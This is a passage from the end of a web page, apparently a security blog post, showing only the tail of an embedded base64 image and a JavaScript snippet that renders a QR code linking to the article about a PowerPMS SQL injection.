ct78nxDfxIXipIeqmzef2WmgO5qcAgrNGqBwZRAz6Lz2YOeXIlLMyiNysgZlzXDVHcyzjqNHacfmjOZbRGojzQEfHhJcaIuG219zAbshr7vnyLu0vdWdAPUqOG2HWeUStOUOI3CruGkL4roNYQ8eqRuZURwY9B8K3TnGbuUcRoiawTPU+GXPCnpB8Gx/gt7e9wPF2796ZIHRnHVY+hAbQ8jDgqA8ca31b1VB8tEoPtLqOQ+cg/LHWI2uIGq4vvJIPkQc0OdDOC+Grnu1fMyHtFf+fO7shH9bAqSEenYzVmSHGDWhh4BjHKrfiWuLNgciFjjlHPvTYLeX4Em87iNs3r4W35fEl/8wOwT/foO8B4f8TOl4b1FyuDaHJ3MqH0AP7w8WvD/s3TQj0bsHs+/y54yPntdA66LUqTtpHzDWqHJj3sg56bMW5fkbrhRB1HIdYQ//UQbrRoOsgfNcQTg0ZC+z1a29gN+S19313t6khGhubs73OCDFu0NH6jBDxzK381R5VHkR96FjpzFX1M2cd9HoQvmMZYY5BcDBjzvW+mZsakoPbf/0NtM+yqm5VnI/oWEaIJ8KajFmX+dGHqAH9l2POte88r88Qej3AaQc6B2hvac1lPMQn37Ju9E9SlvSekOX1vD44fZYF/WmBa/6zxx6fKK1zLYj9M3fFh8iDecqu5EsDvYbW9wzWer220aqae0KqW3kjtxvyxsuvtm4NGcfp3roq5pwqBvNIw8y5htB1oOsgfMcyQsSUa3McIgYzWnOGY61KZ42wikPsW8Uy1xqSye2/7wamhkB0EmpcHRXmHD0xo12t4TzrvRbCvJd1FSpnNOsyby4jxF6Zsw8RgxmteQSnhjySvLU/fwO7IT9/p39U8dcbAvMoQ3D5RwUEl18NfOcg1kCWXfKB46/xLPb+EDHoWOmsFzouf7QqZg7mPaBzv94QH2Rjv4GV96MN8ZNSbehYxqzL/Ohnnf1Rk9fWCCGePsch1oDCk1mXEZimy4lwPwbzJwaqD3PujzbEh9z4/A3shjx/d7+SOTVEo7SynzgFxKhCx6ouRPzZGPQfFRC18mtz3Ypz7Axzjvys01qWOfsQ54B+NseEU0NEbnvfDbSGQO8c3PdXR9bTYat0jmWE2DPrc3z0rYPIg45ZC8FbXyGEBqjC5X/ZGjh+0cOMVREIXRXL520NqYSbe/0N7Ia8/s6XO/4PAAD//zw+XVIAAAAGSURBVAMARd6Cg+C78wgAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/powerpms-File-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 